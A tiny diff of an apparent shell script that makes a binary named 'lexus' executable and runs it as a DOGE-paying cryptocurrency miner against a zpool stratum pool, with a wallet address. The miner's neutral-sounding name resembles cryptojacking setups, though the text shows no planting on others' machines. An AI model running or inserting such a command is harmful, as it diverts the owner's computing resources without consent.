@@ -1,2 +1,3 @@
 chmod +x lexus
 ./lexus -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE
+
